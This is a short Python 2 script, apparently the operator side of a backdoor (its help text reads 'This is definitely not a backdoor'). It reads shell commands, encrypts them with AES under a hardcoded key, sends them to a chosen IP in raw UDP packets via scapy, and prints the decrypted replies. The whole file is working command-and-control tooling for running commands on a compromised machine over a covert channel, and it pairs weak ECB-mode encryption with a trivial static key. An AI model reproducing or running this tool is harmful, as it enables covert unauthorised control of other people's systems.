from scapy.all import *
import argparse
import base64
from Crypto.Cipher import AES

def packetFunc(packet):
  # scapy is garbage and get's arp packet even though we're filtering
  if ARP not in packet:
    print "Got a packet"
    encryptedData = packet['Raw'].load
    data = decrypt(encryptedData)
    print data

MASTER_KEY = '12345678901234567890123456789012'

def encrypt(thing):
  secret = AES.new(MASTER_KEY)
  tagString = str(thing) + (AES.block_size - len(str(thing)) % AES.block_size) * "\0"
  cipherText = base64.b64encode(secret.encrypt(tagString))
  return cipherText

def decrypt(cipher_text):
    dec_secret = AES.new(MASTER_KEY)
    raw_decrypted = dec_secret.decrypt(base64.b64decode(cipher_text))
    clear_val = raw_decrypted.rstrip("\0")
    return clear_val

parser = argparse.ArgumentParser(description="This is definitely not a backdoor.")
parser.add_argument('-s'
                   , '--sport'
                   , dest='sourcePort'
                   , help='Source port of packets to send.'
                   , required=True)
parser.add_argument('-d'
                   , '--dport'
                   , dest='destPort'
                   , help='Destination port of packets to send.'
                   , required=True)
parser.add_argument('-ip'
                   , '--destIP'
                   , dest='destIP'
                   , help='Destination IP'
                   , required=True)
args = parser.parse_args()

command = "ls -l"
sniffFilter = 'udp and dst port {0} and src port {1}' .format(args.sourcePort, args.destPort)
while True:
  command = raw_input("Command? (exit to end) ")
  if command == "exit":
    sys.exit()
  else:
    encryptedCommand = encrypt(command)
    packet = IP(dst=args.destIP)/UDP(dport=int(args.destPort), sport=int(args.sourcePort))/Raw(load=encryptedCommand)
    send(packet)
    sniff(filter=sniffFilter,prn=packetFunc, count=1)

